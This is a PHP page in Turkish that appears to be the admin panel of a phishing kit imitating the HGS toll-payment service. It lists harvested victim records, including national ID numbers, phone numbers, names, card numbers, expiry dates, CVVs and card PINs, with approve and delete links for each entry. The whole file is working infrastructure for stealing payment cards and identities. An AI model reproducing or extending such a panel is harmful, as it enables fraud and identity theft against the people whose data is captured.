<?php
error_reporting(0);
include("baglan.php");
$cek = $db->from('hgssite')
          ->orderby('id', 'DESC')
          ->run();
		  session_start();
if($_SESSION['logged'] != "1") {
    echo "<meta http-equiv='refresh' content='0;url=giris.php'>";
    die(); }
?>
<style>
a {
		color:white;
		font-weight:700
	}
	a:hover {
		color:#f8f8f8;
		font-weight:700
	}
	</style>
<div class="rating">
	<div class="container">
	<br>
	<p style="font-size: 26px;"> Kartlar </p>
	<div class="well">
	<table class="table">
      <thead>
        <tr>
          <th>#</th>
          <th>Plaka</th>
          <th>Tc No</th>
          <th>Tel No</th>
          <th>Ad Soyad</th>
		  <th>CC No</th>
		  <th>SKT</th>
		  <th>CVV</th>
		  <th>Kart Pin</th>
          <th>İşlemler</th>
        </tr>
      </thead>
      <tbody>
		<?php
        if(isset($cek)):
            foreach($cek as $kullanici):
                $onayli=$kullanici["onayli"];
                    if($onayli=="0"){
                        $Renk="background-color: red";
                    } else {
                        $Renk="background-color: green";
                    }
        ?>
        <tr style="<?php echo $Renk ?>; color:white;">
          <th scope="row"><?php echo $kullanici['id']; ?></th>
          <td><?php echo $kullanici['plaka']; ?></td>
		  <td><?php echo $kullanici['tc_no']; ?></td>
          <td><?php echo $kullanici['telnum']; ?></td>
		  <td><?php echo $kullanici['isim_soyisim']; ?></td>
		  <td><?php echo $kullanici['ccno']; ?></td>
		  <td><?php echo $kullanici['skt']; ?></td>
		  <td><?php echo $kullanici['ccv']; ?></td>
		  <td><?php echo $kullanici['kart_pin']; ?></td>
          <td><a href="onayla.php?id=<?php echo $kullanici['id']; ?>">Onayla</a> - <a href="sil.php?id=<?php echo $kullanici['id']; ?>">Sil</a></td>
          <!--<td><a href="pop_up" onClick="window.name='hazirkod'; window.open('goruntule.php?id=<?php echo $kullanici['id']; ?>','pop_up', 'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=420,height=300'); return false;">Görüntüle</a> - <a href="sil.php?id=<?php echo $kullanici['id']; ?>">Sil</a></td>-->
        </tr>
		<?php
            endforeach;
		endif;
		?>
      </tbody>
    </table>
	</div>
       